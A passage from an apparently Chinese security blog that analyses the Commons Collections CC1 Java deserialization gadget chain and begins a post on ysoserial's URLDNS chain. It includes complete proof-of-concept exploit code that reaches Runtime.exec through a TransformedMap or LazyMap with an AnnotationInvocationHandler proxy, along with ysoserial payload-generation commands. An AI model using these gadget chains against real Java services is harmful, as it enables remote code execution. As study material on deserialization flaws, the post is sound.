","date":"2022-10-02T15:51:14+08:00","permalink":"https://example.com/post/cc6/","title":"[Java安全] CommonsCollections6链分析"},{"content":"前面写了很多，现在终于到大名鼎鼎的CC链了，这里我还是跟P牛的《Java安全漫谈》来对CC链进行分析学习\nCommonCollection1 前菜 首先P牛帮我们简化CC链成如下代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.util.HashMap; import java.util.Map; public class easycc1 { public static void main(String[] args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;whoami\u0026#34;}), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;); } }   Transformed Transformed是一个接口，他只有一个待实现的方法\n1 2 3 4 5  package org.apache.commons.collections; public interface Transformer { Object transform(Object var1); }   ConstantTransformer ConstantTransformer在CommonCollection里，是实现了Transformer接口的一个类\n它的过程就是在构造函数的时候传⼊⼀个 对象，并在transform⽅法将这个对象再返回\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  public class ConstantTransformer implements Transformer, Serializable { static final long serialVersionUID = 6374440726369055124L; public static final Transformer NULL_INSTANCE = new ConstantTransformer((Object)null); private final Object iConstant; public static Transformer getInstance(Object constantToReturn) { return (Transformer)(constantToReturn == null ? NULL_INSTANCE : new ConstantTransformer(constantToReturn)); } public ConstantTransformer(Object constantToReturn) { this.iConstant = constantToReturn; } public Object transform(Object input) { return this.iConstant; } public Object getConstant() { return this.iConstant; } }   疑问1：这个有啥用，为什么要传入一个对象，然后原封不动的传回来\nInvokerTransformer InvokerTransformer也是CommonCollection中实现了Transformer接⼝的⼀个类\n他的参数有三个，第一个是待执行的方法名，第二个是这个函数的参数列表的类型，第三个则是传给这个方法的参数\n在后面的transform方法中，就执⾏了input对象的iMethodName⽅法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) { this.iMethodName = methodName; this.iParamTypes = paramTypes; this.iArgs = args; } public Object transform(Object input) { if (input == null) { return null; } else { try { Class cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); } catch (NoSuchMethodException var5) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; does not exist\u0026#34;); } catch (IllegalAccessException var6) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; cannot be accessed\u0026#34;); } catch (InvocationTargetException var7) { throw new FunctorException(\u0026#34;InvokerTransformer: The method \u0026#39;\u0026#34; + this.iMethodName + \u0026#34;\u0026#39; on \u0026#39;\u0026#34; + input.getClass() + \u0026#34;\u0026#39; threw an exception\u0026#34;, var7); } } }   疑问2：其实看到这里，我就在想得怎么去执行这个transform函数，接下来的这个ChainedTransformer就解决了我的疑惑\nChainedTransformer ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的transform方法的作⽤是将内部的多个Transformer串在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，这里p牛画了一个图很直观\n实现也很简单，利用构造方法传入一个数组，然后for循环这里，也就是让前一个对象的回调结果作为下一个对象的transform方法的参数，这就解决了我的疑问2\n1 2 3 4 5 6 7 8 9 10 11  public ChainedTransformer(Transformer[] transformers) { this.iTransformers = transformers; } public Object transform(Object object) { for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; }   这里就解决了我的疑问1，因为在这个ChainedTransformer类里面的transform方法里面，可以让我们进行一个连接，让前一个对象的回调结果作为下一个对象的transform方法的参数，所以我们使用ConstantTransformer来包住我们想要加载的对象，在执行ConstantTransformer的transform后得以作为input传给InvokerTransformer去执行函数method.invoke(input, this.iArgs)\n疑问3：那我ChainedTransformer的transform又得怎么执行呢，是由下面介绍的TransformedMap来\nTransformedMap TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时将可以执⾏⼀个回调。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map：\n1 2  Map outerMap = TransformedMap.decorate(innerMap, keyTransformer, valueTransformer);   跟进源码去分析\n其中，keyTransformer是处理新元素的Key的回调，valueTransformer是处理新元素的value的回调。 我们这⾥所说的”回调“，并不是传统意义上的⼀个回调函数，⽽是⼀个实现了Transformer接⼝的类。\n1 2 3  public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) { return new TransformedMap(map, keyTransformer, valueTransformer); }   然后前面说我们对修饰过的Map添加新元素的时候会执行一个回调，在这里也就是一个put函数，我们跟进去看看，这个put方法会对键和值分别执行transformKey和transformValue\n1 2 3 4 5  public Object put(Object key, Object value) { key = this.transformKey(key); value = this.transformValue(value); return this.getMap().put(key, value); }   然后我们再跟进transformValue去看看，可以发现是执行了transform函数的，完成了一次回调\n1 2 3  protected Object transformValue(Object object) { return this.valueTransformer == null ? object : this.valueTransformer.transform(object); }   调试分析 介绍完了这几个Transform，接下来就可以来走这个链子了，这里我调试来跟着走一遍\n首先创建transformers数组：\n第一个是ConstantTransformer对象，传入的是Runtime对象\n第二个是InvokerTransformer对象，传入的是执行的exec方法和他的参数\n1 2 3 4  Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.getRuntime()), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;}), };   然后是ChainedTransformer，把这个数组传进去，赋值给ChainedTransformer的ITransformers\n然后就是TransformedMap.decorate()，先创建一个Map，然后把map传入作为被修饰的Map\n1 2  Map innerMap = new HashMap(); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);   把我们的ChainedTransformer对象传进去作为处理新元素的value的回调valueTransformer\n这样我们的Map就算是被TransformedMap修饰好了，输出outerMap，下一步就是为这个Map插入一个元素去触发我们的ChainedTransformer对象的transform方法\n1  outerMap.put(\u0026#34;test\u0026#34;, \u0026#34;xxxx\u0026#34;);   在更新value的时候，触发valueTransformer也就是我们的ChainedTransformer对象的transform方法\n然后就进入到了这个循环\n1 2 3 4 5 6 7  public Object transform(Object object) { for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; }   此时的object是我们传入的新value，就是个随便的字符串对象，而此时的iTransformers[i]是我们前面传入的数组的第一个元素，也就是ConstantTransformer(Runtime.getRuntime())，这里就调用了他的transform函数，不管输入，直接返回之前存在里面的对象\n1 2 3  public Object transform(Object input) { return this.iConstant; }   那么此时的object就被赋值为Runtime对象了，然后进入下一层循环，此时iTransformers[i]变成了之前定义的数组的第二个元素\n1  InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[]{String.class}, new Object[]{\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;})   把Runtime对象传入，执行他的transform函数，完成RCE\nCC1 前面理解了p牛所做的简易版的CC链，现在就开始进行真正的CC链的分析了\n在前面的demo中，我们手动进行了outerMap.put(\u0026quot;test\u0026quot;, \u0026quot;xxxx\u0026quot;);去触发的漏洞，但是正常环境中，我们进行反序列化的时候如何触发字典的插入操作呢，我们就得去找到一个类，他重写的readObject进行反序列化的时候会执行这样的写入操作，这个类就是sun.reflect.annotation.AnnotationInvocationHandler\nAnnotationInvocationHandler 注意我们分析的是8u71以前的代码，这里我jdk用的是8u65，我们直奔他的readObject方法\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { var1.defaultReadObject(); AnnotationType var2 = null; try { var2 = AnnotationType.getInstance(this.type); } catch (IllegalArgumentException var9) { throw new InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map var3 = var2.memberTypes(); Iterator var4 = this.memberValues.entrySet().iterator(); while(var4.hasNext()) { Entry var5 = (Entry)var4.next(); String var6 = (String)var5.getKey(); Class var7 = (Class)var3.get(var6); if (var7 != null) { Object var8 = var5.getValue(); if (!var7.isInstance(var8) \u0026amp;\u0026amp; !(var8 instanceof ExceptionProxy)) { var5.setValue((new AnnotationTypeMismatchExceptionProxy(var8.getClass() + \u0026#34;[\u0026#34; + var8 + \u0026#34;]\u0026#34;)).setMember((Method)var2.members().get(var6))); } } } }   核心点在这：\nmemberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这里遍历了它的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的 Transform，进而执行我们前面所展示的链子\n1 2 3  Iterator var4 = this.memberValues.entrySet().iterator(); Entry var5 = (Entry)var4.next(); var5.setValue()   所以现在我们就来构造我们的POC\nPOC构造 首先就是AnnotationInvocationHandler对象的创建，因为这个是jdk内部的类，是不能直接new获取的，所以得用反射来获取\n1 2 3 4 5 6 7 8 9 10 11  Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject();   然后是这里的newInstance获取对象了，首先我们去看看AnnotationInvocationHandler的构造方法，这里是要传两个参数的，第一个参数是Class\u0026lt;? extends Annotation\u0026gt; var1，第二个参数是Map\n1 2 3 4 5 6 7 8 9  AnnotationInvocationHandler(Class\u0026lt;? extends Annotation\u0026gt; var1, Map\u0026lt;String, Object\u0026gt; var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() \u0026amp;\u0026amp; var3.length == 1 \u0026amp;\u0026amp; var3[0] == Annotation.class) { this.type = var1; this.memberValues = var2; } else { throw new AnnotationFormatError(\u0026#34;Attempt to create proxy for a non-annotation type.\u0026#34;); } }   他的第一个参数必须是Annotation的子类，这里其实是有很多的，但是为什么选Retention\n首先我们看到最后readObject这里，在最后set这，是有一个判断条件的\n1  if (var7 != null)   这里我调试了很久，但是还是没弄懂，看p牛的文章中是这样说的\n 那么如何让这个var7不为null呢？这一块我就不详细分析了，还会涉及到Java注释相关的技术。直接给 出两个条件：\n sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素  所以，这也解释了为什么我前面用到 Retention.class ，因为Retention有一个方法，名为value；所 以，为了再满足第二个条件，我需要给Map中放入一个Key是value的元素：\n Runtime 但是发现这样还是不能执行命令的，这里报错了，原因是Runtime是不能被反序列化的，我们最早传给ConstantTransformer的是 Runtime.getRuntime() ，而Runtime没有实现serializable接口，是不能被序列化的\n那么我们的解决办法还是有的，我们可以通过反射来获取到当前上下文中的Runtime对象，而不需要直接使用这个类，因为我们的ChainedTransformer的存在，我们可以在数组中把Runtime的反射分开填装进去，就像这样\n原poc\n1 2 3  Method f = Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;); Runtime r = (Runtime) f.invoke(null); r.exec(\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34;);   转换成这样，InvokerTransformer的第一个参数表示要执行的方法，第二个参数表示参数类型，第三个参数作为执行参数列表，需要去匹配第二个参数\n1 2 3 4 5 6  Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class },new String[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34; }), };   以前的Runtime.getRuntime() 是java.lang.Runtime对象，无法序列化，现在变成了Runtime.class，是java.lang.Class 对象，Class类有实现Serializable接口，所以可以被序列化\n这里我们跟一下，仔细的弄清楚这个操作：\n第一次循环\niTransformers[0] = ConstantTransformer(Runtime.class) object不重要不影响\n第二次循环\n前面的ConstantTransformer(Runtime.class)执行了transform，返回class java.lang.Runtime，作为object\n1  iTransformers[1] = InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] })   进入InvokerTransformer的transform，input是class java.lang.Runtime，method是getMethod，参数iArgs是{\u0026quot;getRuntime\u0026quot;,new Class[0]}，\n1 2  return method.invoke(input, this.iArgs); 返回：public static java.lang.Runtime java.lang.Runtime.getRuntime()   其实就等价于\n1  Runtime.class.getMethod(\u0026#34;getRuntime\u0026#34;,new Class[0])   第三次循环\nobject为getRuntime方法\n1  iTransformers[1] = InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]})   同理的执行\n等价于\n1  invoke.invoke(public static java.lang.Runtime java.lang.Runtime.getRuntime(),{ null, new Object[0]})   返回了我们千呼万唤的Runtime对象\n第四次循环\n现在我们通过反射已经拿到了Runtime对象了，接下来就是执行Runtime的exec了\n这个就不多说，前面已经分析过了\nRetention Java注释相关的技术还不太懂，这里有师傅分析过：https://xz.aliyun.com/t/9873\n没分析完整，心里一直过不去，所以到第二天还是老老实实跟了一遍这里\n我们关注这个点的起始点，就在readObject中的这么一段代码\n1  if (var7 != null)   首先我们构造这个AnnotationInvocationHandler对象的时候，var1我们传入的是Retention.class，var2传入的是我们构造的TransformedMap\n1 2 3 4 5 6 7 8 9  AnnotationInvocationHandler(Class\u0026lt;? extends Annotation\u0026gt; var1, Map\u0026lt;String, Object\u0026gt; var2) { Class[] var3 = var1.getInterfaces(); if (var1.isAnnotation() \u0026amp;\u0026amp; var3.length == 1 \u0026amp;\u0026amp; var3[0] == Annotation.class) { this.type = var1; this.memberValues = var2; } else { throw new AnnotationFormatError(\u0026#34;Attempt to create proxy for a non-annotation type.\u0026#34;); } }   var1会被赋值给this.type，var2会被赋值给this.memberValues\n在反序列化的时候，进入readObject方法，执行了这么一段代码\n1  var2 = AnnotationType.getInstance(this.type);   我们跟进AnnotationType.getInstance，传入的参数是this.type也就是Retention.class\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  public static AnnotationType getInstance(Class\u0026lt;? extends Annotation\u0026gt; var0) { JavaLangAccess var1 = SharedSecrets.getJavaLangAccess(); AnnotationType var2 = var1.getAnnotationType(var0); if (var2 == null) { var2 = new AnnotationType(var0); if (!var1.casAnnotationType(var0, (AnnotationType)null, var2)) { var2 = var1.getAnnotationType(var0); assert var2 != null; } } return var2; }   这里会进入到 new AnnotationType(var0);，然后继续往下走，此时的var2的值就是Retention的方法列表，Retention只有一个方法那就是value()\n我们再往下跟，var2传递到var3，然后就进入循环，这里循环把方法列表var3中的方法取出存在var6\n然后再执行String var7 = var6.getName();，获取方法名存在var7中\n然后再put作为键值存入memberTypes\n走出这个方法，可以看到var2的memberTypes是个HashMap，他的第一个元素的键值就是Retention的方法value的字符串\n然后再回到readObject，这里var2出来以后，他的memberTypes赋值给了var3\n继续往下，var6是var5的key，也就是“value”，终于走到var7\nvar7=var3.get(\u0026quot;value\u0026quot;)\n刚好我们var3的键就是value，所以var7不会为null，就执行了我们想要的setValue了\n至此，CommonCollection1利用链我们就已经分析结束了\nLazyMap 观察ysoserial中的CC1的payload，可以发现这里用的不是我们上一篇文章介绍到的TransformedMap而是LazyMap\n那我们先来研究一下这个LazyMap\nLazyMap和TransformedMap的区别在于，TransformedMap触发transform的地方在于Map的写入操作，LazyMap触发transform的操作是在他的get方法中执行this.factory.transform(key);\n1 2 3 4 5 6 7 8 9  public Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } }   而且factory是可控的\n1 2 3 4 5 6 7 8 9 10 11 12  public static Map decorate(Map map, Transformer factory) { return new LazyMap(map, factory); } protected LazyMap(Map map, Transformer factory) { super(map); if (factory == null) { throw new IllegalArgumentException(\u0026#34;Factory must not be null\u0026#34;); } else { this.factory = factory; } }   我们要使用的话只需要把Map和transformerChain传入即可\n1  Map lazyMap = LazyMap.decorate(innerMap, transformerChain);   但是这样一来，我们之前的AnnotationInvocationHandler的readObject就不行了，这里我们看看ysoserial的Gadget\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() Map(Proxy).entrySet() AnnotationInvocationHandler.invoke() LazyMap.get() ChainedTransformer.transform() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec()   可以看到这里是用的一个AnnotationInvocationHandler.invoke()\n那么现在的问题就是如何调用到这个invoke方法了，可以看到gadget写的是Proxy，这里就涉及到一个Java的技术：动态代理\n动态代理 动态代理的其实很好理解，首先我们知道接口interface是不能直接被实例化的，而是用一个class去实现他，然后实例化类来操作的，那么有一种，不编写实现类，直接在运行期创建某个interface实例的技术，他就叫做动态代理\n那么要创建一个interface实例的方法就是如下所示：\n 定义一个InvocationHandler实例，它负责实现接口的方法调用 通过Proxy.newProxyInstance()创建interface实例，它需要3个参数：  使用的ClassLoader，通常就是接口类的ClassLoader 需要实现的接口数组，至少需要传入一个接口进去 用来处理接口方法调用的InvocationHandler实例   将返回的Object强制转型为接口  我们用个例子来理解：\n首先我们先实现InvocationHandler接口的invoke方法，invoke的作用就是当ProxyTest1对象执行函数的时候调用，所以这里的意思就是检测执行的方法为get的时候，输出一句Hacked\nProxyTest1.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.util.Map; public class ProxyTest1 implements InvocationHandler { protected Map map; public ProxyTest1(Map map) { this.map = map; } @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { if(method.getName().compareTo(\u0026#34;get\u0026#34;)==0){ System.out.println(\u0026#34;Hacked\u0026#34;); } return method.invoke(this.map,args); } }   然后我们在外部调用ProxyTest1\nProxyTest2.java\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class ProxyTest2 { public static void main(String args[]){ InvocationHandler handler = new ProxyTest1(new HashMap()); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[] {Map.class},handler); proxyMap.put(\u0026#34;aaa\u0026#34;,\u0026#34;bbb\u0026#34;); String res = (String) proxyMap.get(\u0026#34;aaa\u0026#34;); System.out.println(res); } }   LazyMap利用链构造 了解了动态代理，我们再回头看看，我们刚才是在想得怎么调用AnnotationInvocationHandler.invoke()，我们去翻源码会发现，其实他就是实现了InvocationHandler接口的，那就非常的巧了，我们如果用AnnotationInvocationHandler去代理我设计好的Map的话，那么这个Map执行任意的方法都会走进invoke从而进入我们构造好的链子了\n所以我们可以这样开始写POC了，前面的都是没变的，TransformedMap换成LazyMap\n然后用Proxy代理，但是不能直接拿去反序列化，因为我们要入口点是是sun.reflect.annotation.AnnotationInvocationHandler#readObject\n所以还要用AnnotationInvocationHandler对这个proxyMap进行包裹\n1 2  handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);   最后的POC\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45  import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Retention; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CC1pro { public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException, InstantiationException, IllegalAccessException, NoSuchMethodException, IOException { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026#34;getMethod\u0026#34;, new Class[] {String.class, Class[].class }, new Object[] { \u0026#34;getRuntime\u0026#34;, new Class[0] }), new InvokerTransformer(\u0026#34;invoke\u0026#34;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0]}), new InvokerTransformer(\u0026#34;exec\u0026#34;, new Class[] { String.class }, new String[] {\u0026#34;/System/Applications/Calculator.app/Contents/MacOS/Calculator\u0026#34; }), }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); Map outerMap = LazyMap.decorate(innerMap, transformerChain); Class clazz = Class.forName(\u0026#34;sun.reflect.annotation.AnnotationInvocationHandler\u0026#34;); Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class); construct.setAccessible(true); InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap); Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler); handler = (InvocationHandler) construct.newInstance(Retention.class,proxyMap); ByteArrayOutputStream barr = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(barr); oos.writeObject(handler); oos.close(); System.out.println(barr); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray())); Object o = (Object)ois.readObject(); } }   后记 前一篇文章说了，我们所测试的jdk版本是8u71以前的版本，而此版本以后的jdk，Java 官方修改了 sun.reflect.annotation.AnnotationInvocationHandler 的 readObject函数\n变成了如下代码\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33  private void readObject(ObjectInputStream var1) throws IOException, ClassNotFoundException { GetField var2 = var1.readFields(); Class var3 = (Class)var2.get(\u0026#34;type\u0026#34;, (Object)null); Map var4 = (Map)var2.get(\u0026#34;memberValues\u0026#34;, (Object)null); AnnotationType var5 = null; try { var5 = AnnotationType.getInstance(var3); } catch (IllegalArgumentException var13) { throw new InvalidObjectException(\u0026#34;Non-annotation type in annotation serial stream\u0026#34;); } Map var6 = var5.memberTypes(); LinkedHashMap var7 = new LinkedHashMap(); String var10; Object var11; for(Iterator var8 = var4.entrySet().iterator(); var8.hasNext(); var7.put(var10, var11)) { Entry var9 = (Entry)var8.next(); var10 = (String)var9.getKey(); var11 = null; Class var12 = (Class)var6.get(var10); if (var12 != null) { var11 = var9.getValue(); if (!var12.isInstance(var11) \u0026amp;\u0026amp; !(var11 instanceof ExceptionProxy)) { var11 = (new AnnotationTypeMismatchExceptionProxy(var11.getClass() + \u0026#34;[\u0026#34; + var11 + \u0026#34;]\u0026#34;)).setMember((Method)var5.members().get(var10)); } } } AnnotationInvocationHandler.UnsafeAccessor.setType(this, var3); AnnotationInvocationHandler.UnsafeAccessor.setMemberValues(this, var7); }   他让我们传入的Map不会再执行set或put操作了，所以这里就不能再用了\n对于高版本的绕过，就在我们的下一篇文章CommonCollection6\n参考文章：\nJava安全漫谈\nhttps://ego00.blog.csdn.net/article/details/119705730\nhttps://xz.aliyun.com/t/9873\n","date":"2022-09-29T14:05:47+08:00","permalink":"https://example.com/post/cc1/","title":"[Java安全] CommonsCollections1链分析"},{"content":"前言 Java反序列化的基础知识前面已经大概了解了，现在终于到上手的时候了，这里按p牛说的来，先从DNSURL下手，进行反序列利用链的入门\nysoserial 这个工具我之前没专门研究过Java，但是也是在一些文章中见过很多次了，他的作用就是根据你选择的利用链去生成反序列化数据的工具\n使用方法也很简单，选择利用链和要执行的命令就行了\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38  Usage: java -jar ysoserial.jar [payload] \u0026#39;[command]\u0026#39; Available payload types: Payload Authors Dependencies ------- ------- ------------ AspectJWeaver @Jang aspectjweaver:1.9.2, commons-collections:3.2.2 BeanShell1 @pwntester, @cschneider4711 bsh:2.0b5 C3P0 @mbechler c3p0:0.9.5.2, mchange-commons-java:0.2.11 Click1 @artsploit click-nodeps:2.3.0, javax.servlet-api:3.1.0 Clojure @JackOfMostTrades clojure:1.8.0 CommonsBeanutils1 @frohoff commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2 CommonsCollections1 @frohoff commons-collections:3.1 CommonsCollections2 @frohoff commons-collections4:4.0 CommonsCollections3 @frohoff commons-collections:3.1 CommonsCollections4 @frohoff commons-collections4:4.0 CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1 CommonsCollections6 @matthias_kaiser commons-collections:3.1 CommonsCollections7 @scristalli, @hanyrax, @EdoardoVignati commons-collections:3.1 FileUpload1 @mbechler commons-fileupload:1.3.1, commons-io:2.4 Groovy1 @frohoff groovy:2.3.9 Hibernate1 @mbechler Hibernate2 @mbechler JBossInterceptors1 @matthias_kaiser javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 JRMPClient @mbechler JRMPListener @mbechler JSON1 @mbechler json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1 JavassistWeld1 @matthias_kaiser javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21 Jdk7u21 @frohoff Jython1 @pwntester, @cschneider4711 jython-standalone:2.5.2 MozillaRhino1 @matthias_kaiser js:1.7R2 MozillaRhino2 @_tint0 js:1.7R2 Myfaces1 @mbechler Myfaces2 @mbechler ROME @mbechler rome:1.0 Spring1 @frohoff spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE Spring2 @mbechler spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2 URLDNS @gebl Vaadin1 @kai_ullrich vaadin-server:7.7.14, vaadin-shared:7.7.14 Wicket1 @jacob-baines wicket-util:6.23.0, slf4j-api:1.6.4   使用实例\n1  java -jar ysoserial.jar CommonsCollections1 calc.exe \u0026gt; payload   URLDNS 接下来就到了这篇文章的主题：URLDNS\n他是一条利用链的名字，但是他和平常的利用链不一样，他的参数不是命令，而是URL，他触发的也不是命令执行，而是发起一次DNS请求\n我们直接去他的repo分析一下ysoserial的代码是怎么写的\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42  public class URLDNS implements ObjectPayload\u0026lt;Object\u0026gt; { public Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation  //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload.  URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL  URL u = new URL(null, url, handler); // URL to use as the Key  ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.  Reflections.setFieldValue(u, \u0026#34;hashCode\u0026#34;, -1); // During the put above, the URL\u0026#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.  return ht; } public static void main(final String[] args) throws Exception { PayloadRunner.run(URLDNS.class, args); } /** * \u0026lt;p\u0026gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance. * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior * using the serialized object.\u0026lt;/p\u0026gt; * * \u0026lt;b\u0026gt;Potential false negative:\u0026lt;/b\u0026gt; * \u0026lt;p\u0026gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the * second resolution.\u0026lt;/p\u0026gt; */ static class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } }   可以看到代码注释里写了gadget\n1 2 3 4 5  * Gadget Chain: * HashMap.readObject() * HashMap.putVal() * HashMap.hash() * URL.hashCode()   他是从HashMap的readObject开始的，我们跟进去这里看看\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44  private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException { // Read in the threshold (ignored), loadfactor, 